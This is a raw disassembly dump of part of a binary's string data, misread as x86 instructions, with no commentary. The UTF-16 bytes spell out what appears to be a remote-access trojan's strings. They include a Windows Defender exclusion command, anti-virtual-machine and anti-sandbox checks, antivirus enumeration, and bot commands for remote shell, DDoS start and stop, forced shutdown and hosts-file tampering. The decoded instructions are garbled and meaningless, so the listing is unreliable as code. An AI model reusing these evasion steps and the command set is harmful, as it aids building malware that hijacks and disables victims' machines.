  40a076:	72 00                	jb     0x40a078
  40a078:	65 00 66 00          	add    %ah,%gs:0x0(%esi)
  40a07c:	65 00 72 00          	add    %dh,%gs:0x0(%edx)
  40a080:	65 00 6e 00          	add    %ch,%gs:0x0(%esi)
  40a084:	63 00                	arpl   %eax,(%eax)
  40a086:	65 00 20             	add    %ah,%gs:(%eax)
  40a089:	00 2d 00 45 00 78    	add    %ch,0x78004500
  40a08f:	00 63 00             	add    %ah,0x0(%ebx)
  40a092:	6c                   	insb   (%dx),%es:(%edi)
  40a093:	00 75 00             	add    %dh,0x0(%ebp)
  40a096:	73 00                	jae    0x40a098
  40a098:	69 00 6f 00 6e 00    	imul   $0x6e006f,(%eax),%eax
  40a09e:	50                   	push   %eax
  40a09f:	00 72 00             	add    %dh,0x0(%edx)
  40a0a2:	6f                   	outsl  %ds:(%esi),(%dx)
  40a0a3:	00 63 00             	add    %ah,0x0(%ebx)
  40a0a6:	65 00 73 00          	add    %dh,%gs:0x0(%ebx)
  40a0aa:	73 00                	jae    0x40a0ac
  40a0ac:	20 00                	and    %al,(%eax)
  40a0ae:	27                   	daa
  40a0af:	00 01                	add    %al,(%ecx)
  40a0b1:	4d                   	dec    %ebp
  40a0b2:	68 00 74 00 74       	push   $0x74007400
  40a0b7:	00 70 00             	add    %dh,0x0(%eax)
  40a0ba:	3a 00                	cmp    (%eax),%al
  40a0bc:	2f                   	das
  40a0bd:	00 2f                	add    %ch,(%edi)
  40a0bf:	00 69 00             	add    %ch,0x0(%ecx)
  40a0c2:	70 00                	jo     0x40a0c4
  40a0c4:	2d 00 61 00 70       	sub    $0x70006100,%eax
  40a0c9:	00 69 00             	add    %ch,0x0(%ecx)
  40a0cc:	2e 00 63 00          	add    %ah,%cs:0x0(%ebx)
  40a0d0:	6f                   	outsl  %ds:(%esi),(%dx)
  40a0d1:	00 6d 00             	add    %ch,0x0(%ebp)
  40a0d4:	2f                   	das
  40a0d5:	00 6c 00 69          	add    %ch,0x69(%eax,%eax,1)
  40a0d9:	00 6e 00             	add    %ch,0x0(%esi)
  40a0dc:	65 00 2f             	add    %ch,%gs:(%edi)
  40a0df:	00 3f                	add    %bh,(%edi)
  40a0e1:	00 66 00             	add    %ah,0x0(%esi)
  40a0e4:	69 00 65 00 6c 00    	imul   $0x6c0065,(%eax),%eax
  40a0ea:	64 00 73 00          	add    %dh,%fs:0x0(%ebx)
  40a0ee:	3d 00 68 00 6f       	cmp    $0x6f006800,%eax
  40a0f3:	00 73 00             	add    %dh,0x0(%ebx)
  40a0f6:	74 00                	je     0x40a0f8
  40a0f8:	69 00 6e 00 67 00    	imul   $0x67006e,(%eax),%eax
  40a0fe:	01 09                	add    %ecx,(%ecx)
  40a100:	74 00                	je     0x40a102
  40a102:	72 00                	jb     0x40a104
  40a104:	75 00                	jne    0x40a106
  40a106:	65 00 00             	add    %al,%gs:(%eax)
  40a109:	05 78 00 70 00       	add    $0x700078,%eax
  40a10e:	00 45 53             	add    %al,0x53(%ebp)
  40a111:	00 65 00             	add    %ah,0x0(%ebp)
  40a114:	6c                   	insb   (%dx),%es:(%edi)
  40a115:	00 65 00             	add    %ah,0x0(%ebp)
  40a118:	63 00                	arpl   %eax,(%eax)
  40a11a:	74 00                	je     0x40a11c
  40a11c:	20 00                	and    %al,(%eax)
  40a11e:	2a 00                	sub    (%eax),%al
  40a120:	20 00                	and    %al,(%eax)
  40a122:	66 00 72 00          	data16 add %dh,0x0(%edx)
  40a126:	6f                   	outsl  %ds:(%esi),(%dx)
  40a127:	00 6d 00             	add    %ch,0x0(%ebp)
  40a12a:	20 00                	and    %al,(%eax)
  40a12c:	57                   	push   %edi
  40a12d:	00 69 00             	add    %ch,0x0(%ecx)
  40a130:	6e                   	outsb  %ds:(%esi),(%dx)
  40a131:	00 33                	add    %dh,(%ebx)
  40a133:	00 32                	add    %dh,(%edx)
  40a135:	00 5f 00             	add    %bl,0x0(%edi)
  40a138:	43                   	inc    %ebx
  40a139:	00 6f 00             	add    %ch,0x0(%edi)
  40a13c:	6d                   	insl   (%dx),%es:(%edi)
  40a13d:	00 70 00             	add    %dh,0x0(%eax)
  40a140:	75 00                	jne    0x40a142
  40a142:	74 00                	je     0x40a144
  40a144:	65 00 72 00          	add    %dh,%gs:0x0(%edx)
  40a148:	53                   	push   %ebx
  40a149:	00 79 00             	add    %bh,0x0(%ecx)
  40a14c:	73 00                	jae    0x40a14e
  40a14e:	74 00                	je     0x40a150
  40a150:	65 00 6d 00          	add    %ch,%gs:0x0(%ebp)
  40a154:	00 07                	add    %al,(%edi)
  40a156:	47                   	inc    %edi
  40a157:	00 65 00             	add    %ah,0x0(%ebp)
  40a15a:	74 00                	je     0x40a15c
  40a15c:	00 19                	add    %bl,(%ecx)
  40a15e:	4d                   	dec    %ebp
  40a15f:	00 61 00             	add    %ah,0x0(%ecx)
  40a162:	6e                   	outsb  %ds:(%esi),(%dx)
  40a163:	00 75 00             	add    %dh,0x0(%ebp)
  40a166:	66 00 61 00          	data16 add %ah,0x0(%ecx)
  40a16a:	63 00                	arpl   %eax,(%eax)
  40a16c:	74 00                	je     0x40a16e
  40a16e:	75 00                	jne    0x40a170
  40a170:	72 00                	jb     0x40a172
  40a172:	65 00 72 00          	add    %dh,%gs:0x0(%edx)
  40a176:	00 2b                	add    %ch,(%ebx)
  40a178:	6d                   	insl   (%dx),%es:(%edi)
  40a179:	00 69 00             	add    %ch,0x0(%ecx)
  40a17c:	63 00                	arpl   %eax,(%eax)
  40a17e:	72 00                	jb     0x40a180
  40a180:	6f                   	outsl  %ds:(%esi),(%dx)
  40a181:	00 73 00             	add    %dh,0x0(%ebx)
  40a184:	6f                   	outsl  %ds:(%esi),(%dx)
  40a185:	00 66 00             	add    %ah,0x0(%esi)
  40a188:	74 00                	je     0x40a18a
  40a18a:	20 00                	and    %al,(%eax)
  40a18c:	63 00                	arpl   %eax,(%eax)
  40a18e:	6f                   	outsl  %ds:(%esi),(%dx)
  40a18f:	00 72 00             	add    %dh,0x0(%edx)
  40a192:	70 00                	jo     0x40a194
  40a194:	6f                   	outsl  %ds:(%esi),(%dx)
  40a195:	00 72 00             	add    %dh,0x0(%edx)
  40a198:	61                   	popa
  40a199:	00 74 00 69          	add    %dh,0x69(%eax,%eax,1)
  40a19d:	00 6f 00             	add    %ch,0x0(%edi)
  40a1a0:	6e                   	outsb  %ds:(%esi),(%dx)
  40a1a1:	00 00                	add    %al,(%eax)
  40a1a3:	0b 4d 00             	or     0x0(%ebp),%ecx
  40a1a6:	6f                   	outsl  %ds:(%esi),(%dx)
  40a1a7:	00 64 00 65          	add    %ah,0x65(%eax,%eax,1)
  40a1ab:	00 6c 00 00          	add    %ch,0x0(%eax,%eax,1)
  40a1af:	0f 56 00             	orps   (%eax),%xmm0
  40a1b2:	49                   	dec    %ecx
  40a1b3:	00 52 00             	add    %dl,0x0(%edx)
  40a1b6:	54                   	push   %esp
  40a1b7:	00 55 00             	add    %dl,0x0(%ebp)
  40a1ba:	41                   	inc    %ecx
  40a1bb:	00 4c 00 00          	add    %cl,0x0(%eax,%eax,1)
  40a1bf:	0d 76 00 6d 00       	or     $0x6d0076,%eax
  40a1c4:	77 00                	ja     0x40a1c6
  40a1c6:	61                   	popa
  40a1c7:	00 72 00             	add    %dh,0x0(%edx)
  40a1ca:	65 00 00             	add    %al,%gs:(%eax)
  40a1cd:	15 56 00 69 00       	adc    $0x690056,%eax
  40a1d2:	72 00                	jb     0x40a1d4
  40a1d4:	74 00                	je     0x40a1d6
  40a1d6:	75 00                	jne    0x40a1d8
  40a1d8:	61                   	popa
  40a1d9:	00 6c 00 42          	add    %ch,0x42(%eax,%eax,1)
  40a1dd:	00 6f 00             	add    %ch,0x0(%edi)
  40a1e0:	78 00                	js     0x40a1e2
  40a1e2:	00 17                	add    %dl,(%edi)
  40a1e4:	53                   	push   %ebx
  40a1e5:	00 62 00             	add    %ah,0x0(%edx)
  40a1e8:	69 00 65 00 44 00    	imul   $0x440065,(%eax),%eax
  40a1ee:	6c                   	insb   (%dx),%es:(%edi)
  40a1ef:	00 6c 00 2e          	add    %ch,0x2e(%eax,%eax,1)
  40a1f3:	00 64 00 6c          	add    %ah,0x6c(%eax,%eax,1)
  40a1f7:	00 6c 00 00          	add    %ch,0x0(%eax,%eax,1)
  40a1fb:	09 49 00             	or     %ecx,0x0(%ecx)
  40a1fe:	4e                   	dec    %esi
  40a1ff:	00 46 00             	add    %al,0x0(%esi)
  40a202:	4f                   	dec    %edi
  40a203:	00 00                	add    %al,(%eax)
  40a205:	13 4d 00             	adc    0x0(%ebp),%ecx
  40a208:	69 00 63 00 72 00    	imul   $0x720063,(%eax),%eax
  40a20e:	6f                   	outsl  %ds:(%esi),(%dx)
  40a20f:	00 73 00             	add    %dh,0x0(%ebx)
  40a212:	6f                   	outsl  %ds:(%esi),(%dx)
  40a213:	00 66 00             	add    %ah,0x0(%esi)
  40a216:	74 00                	je     0x40a218
  40a218:	00 19                	add    %bl,(%ecx)
  40a21a:	53                   	push   %ebx
  40a21b:	00 65 00             	add    %ah,0x0(%ebp)
  40a21e:	72 00                	jb     0x40a220
  40a220:	76 00                	jbe    0x40a222
  40a222:	69 00 63 00 65 00    	imul   $0x650063,(%eax),%eax
  40a228:	20 00                	and    %al,(%eax)
  40a22a:	50                   	push   %eax
  40a22b:	00 61 00             	add    %ah,0x0(%ecx)
  40a22e:	63 00                	arpl   %eax,(%eax)
  40a230:	6b 00 00             	imul   $0x0,(%eax),%eax
  40a233:	05 53 00 50 00       	add    $0x500053,%eax
  40a238:	00 03                	add    %al,(%ebx)
  40a23a:	20 00                	and    %al,(%eax)
  40a23c:	00 0b                	add    %cl,(%ebx)
  40a23e:	46                   	inc    %esi
  40a23f:	00 61 00             	add    %ah,0x0(%ecx)
  40a242:	6c                   	insb   (%dx),%es:(%edi)
  40a243:	00 73 00             	add    %dh,0x0(%ebx)
  40a246:	65 00 00             	add    %al,%gs:(%eax)
  40a249:	0b 33                	or     (%ebx),%esi
  40a24b:	00 32                	add    %dh,(%edx)
  40a24d:	00 62 00             	add    %ah,0x0(%edx)
  40a250:	69 00 74 00 00 09    	imul   $0x9000074,(%eax),%eax
  40a256:	54                   	push   %esp
  40a257:	00 72 00             	add    %dh,0x0(%edx)
  40a25a:	75 00                	jne    0x40a25c
  40a25c:	65 00 00             	add    %al,%gs:(%eax)
  40a25f:	0b 36                	or     (%esi),%esi
  40a261:	00 34 00             	add    %dh,(%eax,%eax,1)
  40a264:	62 00                	bound  %eax,(%eax)
  40a266:	69 00 74 00 00 13    	imul   $0x13000074,(%eax),%eax
  40a26c:	64 00 64 00 2f       	add    %ah,%fs:0x2f(%eax,%eax,1)
  40a271:	00 4d 00             	add    %cl,0x0(%ebp)
  40a274:	4d                   	dec    %ebp
  40a275:	00 2f                	add    %ch,(%edi)
  40a277:	00 79 00             	add    %bh,0x0(%ecx)
  40a27a:	79 00                	jns    0x40a27c
  40a27c:	79 00                	jns    0x40a27e
  40a27e:	00 0b                	add    %cl,(%ebx)
  40a280:	45                   	inc    %ebp
  40a281:	00 72 00             	add    %dh,0x0(%edx)
  40a284:	72 00                	jb     0x40a286
  40a286:	6f                   	outsl  %ds:(%esi),(%dx)
  40a287:	00 72 00             	add    %dh,0x0(%edx)
  40a28a:	00 05 5c 00 5c 00    	add    %al,0x5c005c
  40a290:	00 2b                	add    %ch,(%ebx)
  40a292:	5c                   	pop    %esp
  40a293:	00 72 00             	add    %dh,0x0(%edx)
  40a296:	6f                   	outsl  %ds:(%esi),(%dx)
  40a297:	00 6f 00             	add    %ch,0x0(%edi)
  40a29a:	74 00                	je     0x40a29c
  40a29c:	5c                   	pop    %esp
  40a29d:	00 53 00             	add    %dl,0x0(%ebx)
  40a2a0:	65 00 63 00          	add    %ah,%gs:0x0(%ebx)
  40a2a4:	75 00                	jne    0x40a2a6
  40a2a6:	72 00                	jb     0x40a2a8
  40a2a8:	69 00 74 00 79 00    	imul   $0x790074,(%eax),%eax
  40a2ae:	43                   	inc    %ebx
  40a2af:	00 65 00             	add    %ah,0x0(%ebp)
  40a2b2:	6e                   	outsb  %ds:(%esi),(%dx)
  40a2b3:	00 74 00 65          	add    %dh,0x65(%eax,%eax,1)
  40a2b7:	00 72 00             	add    %dh,0x0(%edx)
  40a2ba:	32 00                	xor    (%eax),%al
  40a2bc:	00 3d 53 00 65 00    	add    %bh,0x650053
  40a2c2:	6c                   	insb   (%dx),%es:(%edi)
  40a2c3:	00 65 00             	add    %ah,0x0(%ebp)
  40a2c6:	63 00                	arpl   %eax,(%eax)
  40a2c8:	74 00                	je     0x40a2ca
  40a2ca:	20 00                	and    %al,(%eax)
  40a2cc:	2a 00                	sub    (%eax),%al
  40a2ce:	20 00                	and    %al,(%eax)
  40a2d0:	66 00 72 00          	data16 add %dh,0x0(%edx)
  40a2d4:	6f                   	outsl  %ds:(%esi),(%dx)
  40a2d5:	00 6d 00             	add    %ch,0x0(%ebp)
  40a2d8:	20 00                	and    %al,(%eax)
  40a2da:	41                   	inc    %ecx
  40a2db:	00 6e 00             	add    %ch,0x0(%esi)
  40a2de:	74 00                	je     0x40a2e0
  40a2e0:	69 00 76 00 69 00    	imul   $0x690076,(%eax),%eax
  40a2e6:	72 00                	jb     0x40a2e8
  40a2e8:	75 00                	jne    0x40a2ea
  40a2ea:	73 00                	jae    0x40a2ec
  40a2ec:	50                   	push   %eax
  40a2ed:	00 72 00             	add    %dh,0x0(%edx)
  40a2f0:	6f                   	outsl  %ds:(%esi),(%dx)
  40a2f1:	00 64 00 75          	add    %ah,0x75(%eax,%eax,1)
  40a2f5:	00 63 00             	add    %ah,0x0(%ebx)
  40a2f8:	74 00                	je     0x40a2fa
  40a2fa:	00 17                	add    %dl,(%edi)
  40a2fc:	64 00 69 00          	add    %ch,%fs:0x0(%ecx)
  40a300:	73 00                	jae    0x40a302
  40a302:	70 00                	jo     0x40a304
  40a304:	6c                   	insb   (%dx),%es:(%edi)
  40a305:	00 61 00             	add    %ah,0x0(%ecx)
  40a308:	79 00                	jns    0x40a30a
  40a30a:	4e                   	dec    %esi
  40a30b:	00 61 00             	add    %ah,0x0(%ecx)
  40a30e:	6d                   	insl   (%dx),%es:(%edi)
  40a30f:	00 65 00             	add    %ah,0x0(%ebp)
  40a312:	00 03                	add    %al,(%ebx)
  40a314:	2c 00                	sub    $0x0,%al
  40a316:	00 09                	add    %cl,(%ecx)
  40a318:	4e                   	dec    %esi
  40a319:	00 6f 00             	add    %ch,0x0(%edi)
  40a31c:	6e                   	outsb  %ds:(%esi),(%dx)
  40a31d:	00 65 00             	add    %ah,0x0(%ebp)
  40a320:	00 47 53             	add    %al,0x53(%edi)
  40a323:	00 45 00             	add    %al,0x0(%ebp)
  40a326:	4c                   	dec    %esp
  40a327:	00 45 00             	add    %al,0x0(%ebp)
  40a32a:	43                   	inc    %ebx
  40a32b:	00 54 00 20          	add    %dl,0x20(%eax,%eax,1)
  40a32f:	00 2a                	add    %ch,(%edx)
  40a331:	00 20                	add    %ah,(%eax)
  40a333:	00 46 00             	add    %al,0x0(%esi)
  40a336:	52                   	push   %edx
  40a337:	00 4f 00             	add    %cl,0x0(%edi)
  40a33a:	4d                   	dec    %ebp
  40a33b:	00 20                	add    %ah,(%eax)
  40a33d:	00 57 00             	add    %dl,0x0(%edi)
  40a340:	69 00 6e 00 33 00    	imul   $0x33006e,(%eax),%eax
  40a346:	32 00                	xor    (%eax),%al
  40a348:	5f                   	pop    %edi
  40a349:	00 56 00             	add    %dl,0x0(%esi)
  40a34c:	69 00 64 00 65 00    	imul   $0x650064,(%eax),%eax
  40a352:	6f                   	outsl  %ds:(%esi),(%dx)
  40a353:	00 43 00             	add    %al,0x0(%ebx)
  40a356:	6f                   	outsl  %ds:(%esi),(%dx)
  40a357:	00 6e 00             	add    %ch,0x0(%esi)
  40a35a:	74 00                	je     0x40a35c
  40a35c:	72 00                	jb     0x40a35e
  40a35e:	6f                   	outsl  %ds:(%esi),(%dx)
  40a35f:	00 6c 00 6c          	add    %ch,0x6c(%eax,%eax,1)
  40a363:	00 65 00             	add    %ah,0x0(%ebp)
  40a366:	72 00                	jb     0x40a368
  40a368:	00 09                	add    %cl,(%ecx)
  40a36a:	4e                   	dec    %esi
  40a36b:	00 61 00             	add    %ah,0x0(%ecx)
  40a36e:	6d                   	insl   (%dx),%es:(%edi)
  40a36f:	00 65 00             	add    %ah,0x0(%ebp)
  40a372:	00 3f                	add    %bh,(%edi)
  40a374:	57                   	push   %edi
  40a375:	00 69 00             	add    %ch,0x0(%ecx)
  40a378:	6e                   	outsb  %ds:(%esi),(%dx)
  40a379:	00 33                	add    %dh,(%ebx)
  40a37b:	00 32                	add    %dh,(%edx)
  40a37d:	00 5f 00             	add    %bl,0x0(%edi)
  40a380:	50                   	push   %eax
  40a381:	00 72 00             	add    %dh,0x0(%edx)
  40a384:	6f                   	outsl  %ds:(%esi),(%dx)
  40a385:	00 63 00             	add    %ah,0x0(%ebx)
  40a388:	65 00 73 00          	add    %dh,%gs:0x0(%ebx)
  40a38c:	73 00                	jae    0x40a38e
  40a38e:	6f                   	outsl  %ds:(%esi),(%dx)
  40a38f:	00 72 00             	add    %dh,0x0(%edx)
  40a392:	2e 00 64 00 65       	add    %ah,%cs:0x65(%eax,%eax,1)
  40a397:	00 76 00             	add    %dh,0x0(%esi)
  40a39a:	69 00 63 00 65 00    	imul   $0x650063,(%eax),%eax
  40a3a0:	69 00 64 00 3d 00    	imul   $0x3d0064,(%eax),%eax
  40a3a6:	22 00                	and    (%eax),%al
  40a3a8:	43                   	inc    %ebx
  40a3a9:	00 50 00             	add    %dl,0x0(%eax)
  40a3ac:	55                   	push   %ebp
  40a3ad:	00 30                	add    %dh,(%eax)
  40a3af:	00 22                	add    %ah,(%edx)
  40a3b1:	00 00                	add    %al,(%eax)
  40a3b3:	07                   	pop    %es
  40a3b4:	28 00                	sub    %al,(%eax)
  40a3b6:	52                   	push   %edx
  40a3b7:	00 29                	add    %ch,(%ecx)
  40a3b9:	00 00                	add    %al,(%eax)
  40a3bb:	11 43 00             	adc    %eax,0x0(%ebx)
  40a3be:	6f                   	outsl  %ds:(%esi),(%dx)
  40a3bf:	00 72 00             	add    %dh,0x0(%edx)
  40a3c2:	65 00 28             	add    %ch,%gs:(%eax)
  40a3c5:	00 54 00 4d          	add    %dl,0x4d(%eax,%eax,1)
  40a3c9:	00 29                	add    %ch,(%ecx)
  40a3cb:	00 00                	add    %al,(%eax)
  40a3cd:	07                   	pop    %es
  40a3ce:	43                   	inc    %ebx
  40a3cf:	00 50 00             	add    %dl,0x0(%eax)
  40a3d2:	55                   	push   %ebp
  40a3d3:	00 00                	add    %al,(%eax)
  40a3d5:	07                   	pop    %es
  40a3d6:	20 00                	and    %al,(%eax)
  40a3d8:	47                   	inc    %edi
  40a3d9:	00 42 00             	add    %al,0x0(%edx)
  40a3dc:	00 07                	add    %al,(%edi)
  40a3de:	20 00                	and    %al,(%eax)
  40a3e0:	4d                   	dec    %ebp
  40a3e1:	00 42 00             	add    %al,0x0(%edx)
  40a3e4:	00 0b                	add    %cl,(%ebx)
  40a3e6:	53                   	push   %ebx
  40a3e7:	00 74 00 61          	add    %dh,0x61(%eax,%eax,1)
  40a3eb:	00 72 00             	add    %dh,0x0(%edx)
  40a3ee:	74 00                	je     0x40a3f0
  40a3f0:	00 03                	add    %al,(%ebx)
  40a3f2:	00 00                	add    %al,(%eax)
  40a3f4:	01 0b                	add    %ecx,(%ebx)
  40a3f6:	50                   	push   %eax
  40a3f7:	00 49 00             	add    %cl,0x0(%ecx)
  40a3fa:	4e                   	dec    %esi
  40a3fb:	00 47 00             	add    %al,0x0(%edi)
  40a3fe:	21 00                	and    %eax,(%eax)
  40a400:	00 09                	add    %cl,(%ecx)
  40a402:	70 00                	jo     0x40a404
  40a404:	6f                   	outsl  %ds:(%esi),(%dx)
  40a405:	00 6e 00             	add    %ch,0x0(%esi)
  40a408:	67 00 00             	add    %al,(%bx,%si)
  40a40b:	07                   	pop    %es
  40a40c:	72 00                	jb     0x40a40e
  40a40e:	65 00 63 00          	add    %ah,%gs:0x0(%ebx)
  40a412:	00 0b                	add    %cl,(%ebx)
  40a414:	43                   	inc    %ebx
  40a415:	00 4c 00 4f          	add    %cl,0x4f(%eax,%eax,1)
  40a419:	00 53 00             	add    %dl,0x0(%ebx)
  40a41c:	45                   	inc    %ebp
  40a41d:	00 00                	add    %al,(%eax)
  40a41f:	13 75 00             	adc    0x0(%ebp),%esi
  40a422:	6e                   	outsb  %ds:(%esi),(%dx)
  40a423:	00 69 00             	add    %ch,0x0(%ecx)
  40a426:	6e                   	outsb  %ds:(%esi),(%dx)
  40a427:	00 73 00             	add    %dh,0x0(%ebx)
  40a42a:	74 00                	je     0x40a42c
  40a42c:	61                   	popa
  40a42d:	00 6c 00 6c          	add    %ch,0x6c(%eax,%eax,1)
  40a431:	00 00                	add    %al,(%eax)
  40a433:	0d 75 00 70 00       	or     $0x700075,%eax
  40a438:	64 00 61 00          	add    %ah,%fs:0x0(%ecx)
  40a43c:	74 00                	je     0x40a43e
  40a43e:	65 00 00             	add    %al,%gs:(%eax)
  40a441:	05 44 00 57 00       	add    $0x570044,%eax
  40a446:	00 05 46 00 4d 00    	add    %al,0x4d0046
  40a44c:	00 05 4c 00 4e 00    	add    %al,0x4e004c
  40a452:	00 0f                	add    %cl,(%edi)
  40a454:	55                   	push   %ebp
  40a455:	00 72 00             	add    %dh,0x0(%edx)
  40a458:	6c                   	insb   (%dx),%es:(%edi)
  40a459:	00 6f 00             	add    %ch,0x0(%edi)
  40a45c:	70 00                	jo     0x40a45e
  40a45e:	65 00 6e 00          	add    %ch,%gs:0x0(%esi)
  40a462:	00 0f                	add    %cl,(%edi)
  40a464:	55                   	push   %ebp
  40a465:	00 72 00             	add    %dh,0x0(%edx)
  40a468:	6c                   	insb   (%dx),%es:(%edi)
  40a469:	00 68 00             	add    %ch,0x0(%eax)
  40a46c:	69 00 64 00 65 00    	imul   $0x650064,(%eax),%eax
  40a472:	00 15 50 00 43 00    	add    %dl,0x430050
  40a478:	53                   	push   %ebx
  40a479:	00 68 00             	add    %ch,0x0(%eax)
  40a47c:	75 00                	jne    0x40a47e
  40a47e:	74 00                	je     0x40a480
  40a480:	64 00 6f 00          	add    %ch,%fs:0x0(%edi)
  40a484:	77 00                	ja     0x40a486
  40a486:	6e                   	outsb  %ds:(%esi),(%dx)
  40a487:	00 00                	add    %al,(%eax)
  40a489:	2f                   	das
  40a48a:	73 00                	jae    0x40a48c
  40a48c:	68 00 75 00 74       	push   $0x74007500
  40a491:	00 64 00 6f          	add    %ah,0x6f(%eax,%eax,1)
  40a495:	00 77 00             	add    %dh,0x0(%edi)
  40a498:	6e                   	outsb  %ds:(%esi),(%dx)
  40a499:	00 2e                	add    %ch,(%esi)
  40a49b:	00 65 00             	add    %ah,0x0(%ebp)
  40a49e:	78 00                	js     0x40a4a0
  40a4a0:	65 00 20             	add    %ah,%gs:(%eax)
  40a4a3:	00 2f                	add    %ch,(%edi)
  40a4a5:	00 66 00             	add    %ah,0x0(%esi)
  40a4a8:	20 00                	and    %al,(%eax)
  40a4aa:	2f                   	das
  40a4ab:	00 73 00             	add    %dh,0x0(%ebx)
  40a4ae:	20 00                	and    %al,(%eax)
  40a4b0:	2f                   	das
  40a4b1:	00 74 00 20          	add    %dh,0x20(%eax,%eax,1)
  40a4b5:	00 30                	add    %dh,(%eax)
  40a4b7:	00 00                	add    %al,(%eax)
  40a4b9:	13 50 00             	adc    0x0(%eax),%edx
  40a4bc:	43                   	inc    %ebx
  40a4bd:	00 52 00             	add    %dl,0x0(%edx)
  40a4c0:	65 00 73 00          	add    %dh,%gs:0x0(%ebx)
  40a4c4:	74 00                	je     0x40a4c6
  40a4c6:	61                   	popa
  40a4c7:	00 72 00             	add    %dh,0x0(%edx)
  40a4ca:	74 00                	je     0x40a4cc
  40a4cc:	00 2f                	add    %ch,(%edi)
  40a4ce:	73 00                	jae    0x40a4d0
  40a4d0:	68 00 75 00 74       	push   $0x74007500
  40a4d5:	00 64 00 6f          	add    %ah,0x6f(%eax,%eax,1)
  40a4d9:	00 77 00             	add    %dh,0x0(%edi)
  40a4dc:	6e                   	outsb  %ds:(%esi),(%dx)
  40a4dd:	00 2e                	add    %ch,(%esi)
  40a4df:	00 65 00             	add    %ah,0x0(%ebp)
  40a4e2:	78 00                	js     0x40a4e4
  40a4e4:	65 00 20             	add    %ah,%gs:(%eax)
  40a4e7:	00 2f                	add    %ch,(%edi)
  40a4e9:	00 66 00             	add    %ah,0x0(%esi)
  40a4ec:	20 00                	and    %al,(%eax)
  40a4ee:	2f                   	das
  40a4ef:	00 72 00             	add    %dh,0x0(%edx)
  40a4f2:	20 00                	and    %al,(%eax)
  40a4f4:	2f                   	das
  40a4f5:	00 74 00 20          	add    %dh,0x20(%eax,%eax,1)
  40a4f9:	00 30                	add    %dh,(%eax)
  40a4fb:	00 00                	add    %al,(%eax)
  40a4fd:	11 50 00             	adc    %edx,0x0(%eax)
  40a500:	43                   	inc    %ebx
  40a501:	00 4c 00 6f          	add    %cl,0x6f(%eax,%eax,1)
  40a505:	00 67 00             	add    %ah,0x0(%edi)
  40a508:	6f                   	outsl  %ds:(%esi),(%dx)
  40a509:	00 66 00             	add    %ah,0x0(%esi)
  40a50c:	66 00 00             	data16 add %al,(%eax)
  40a50f:	1f                   	pop    %ds
  40a510:	73 00                	jae    0x40a512
  40a512:	68 00 75 00 74       	push   $0x74007500
  40a517:	00 64 00 6f          	add    %ah,0x6f(%eax,%eax,1)
  40a51b:	00 77 00             	add    %dh,0x0(%edi)
  40a51e:	6e                   	outsb  %ds:(%esi),(%dx)
  40a51f:	00 2e                	add    %ch,(%esi)
  40a521:	00 65 00             	add    %ah,0x0(%ebp)
  40a524:	78 00                	js     0x40a526
  40a526:	65 00 20             	add    %ah,%gs:(%eax)
  40a529:	00 2d 00 4c 00 01    	add    %ch,0x1004c00
  40a52f:	11 52 00             	adc    %edx,0x0(%edx)
  40a532:	75 00                	jne    0x40a534
  40a534:	6e                   	outsb  %ds:(%esi),(%dx)
  40a535:	00 53 00             	add    %dl,0x0(%ebx)
  40a538:	68 00 65 00 6c       	push   $0x6c006500
  40a53d:	00 6c 00 00          	add    %ch,0x0(%eax,%eax,1)
  40a541:	13 53 00             	adc    0x0(%ebx),%edx
  40a544:	74 00                	je     0x40a546
  40a546:	61                   	popa
  40a547:	00 72 00             	add    %dh,0x0(%edx)
  40a54a:	74 00                	je     0x40a54c
  40a54c:	44                   	inc    %esp
  40a54d:	00 44 00 6f          	add    %al,0x6f(%eax,%eax,1)
  40a551:	00 73 00             	add    %dh,0x0(%ebx)
  40a554:	00 11                	add    %dl,(%ecx)
  40a556:	53                   	push   %ebx
  40a557:	00 74 00 6f          	add    %dh,0x6f(%eax,%eax,1)
  40a55b:	00 70 00             	add    %dh,0x0(%eax)
  40a55e:	44                   	inc    %esp
  40a55f:	00 44 00 6f          	add    %al,0x6f(%eax,%eax,1)
  40a563:	00 73 00             	add    %dh,0x0(%ebx)
  40a566:	00 17                	add    %dl,(%edi)
  40a568:	53                   	push   %ebx
  40a569:	00 74 00 61          	add    %dh,0x61(%eax,%eax,1)
  40a56d:	00 72 00             	add    %dh,0x0(%edx)
  40a570:	74 00                	je     0x40a572
  40a572:	52                   	push   %edx
  40a573:	00 65 00             	add    %ah,0x0(%ebp)
  40a576:	70 00                	jo     0x40a578
  40a578:	6f                   	outsl  %ds:(%esi),(%dx)
  40a579:	00 72 00             	add    %dh,0x0(%edx)
  40a57c:	74 00                	je     0x40a57e
  40a57e:	00 15 53 00 74 00    	add    %dl,0x740053
  40a584:	6f                   	outsl  %ds:(%esi),(%dx)
  40a585:	00 70 00             	add    %dh,0x0(%eax)
  40a588:	52                   	push   %edx
  40a589:	00 65 00             	add    %ah,0x0(%ebp)
  40a58c:	70 00                	jo     0x40a58e
  40a58e:	6f                   	outsl  %ds:(%esi),(%dx)
  40a58f:	00 72 00             	add    %dh,0x0(%edx)
  40a592:	74 00                	je     0x40a594
  40a594:	00 0b                	add    %cl,(%ebx)
  40a596:	58                   	pop    %eax
  40a597:	00 63 00             	add    %ah,0x0(%ebx)
  40a59a:	68 00 61 00 74       	push   $0x74006100
  40a59f:	00 00                	add    %al,(%eax)
  40a5a1:	0b 48 00             	or     0x0(%eax),%ecx
  40a5a4:	6f                   	outsl  %ds:(%esi),(%dx)
  40a5a5:	00 73 00             	add    %dh,0x0(%ebx)
  40a5a8:	74 00                	je     0x40a5aa
  40a5aa:	73 00                	jae    0x40a5ac
  40a5ac:	00 25 5c 00 64 00    	add    %ah,0x64005c
  40a5b2:	72 00                	jb     0x40a5b4
  40a5b4:	69 00 76 00 65 00    	imul   $0x650076,(%eax),%eax
  40a5ba:	72 00                	jb     0x40a5bc
  40a5bc:	73 00                	jae    0x40a5be
  40a5be:	5c                   	pop    %esp
  40a5bf:	00 65 00             	add    %ah,0x0(%ebp)
  40a5c2:	74 00                	je     0x40a5c4
  40a5c4:	63 00                	arpl   %eax,(%eax)
  40a5c6:	5c                   	pop    %esp
  40a5c7:	00 68 00             	add    %ch,0x0(%eax)
  40a5ca:	6f                   	outsl  %ds:(%esi),(%dx)
  40a5cb:	00 73 00             	add    %dh,0x0(%ebx)
  40a5ce:	74 00                	je     0x40a5d0
  40a5d0:	73 00                	jae    0x40a5d2
  40a5d2:	00 0d 53 00 68 00    	add    %cl,0x680053
  40a5d8:	6f                   	outsl  %ds:(%esi),(%dx)
  40a5d9:	00 73 00             	add    %dh,0x0(%ebx)
  40a5dc:	74 00                	je     0x40a5de
  40a5de:	73 00                	jae    0x40a5e0
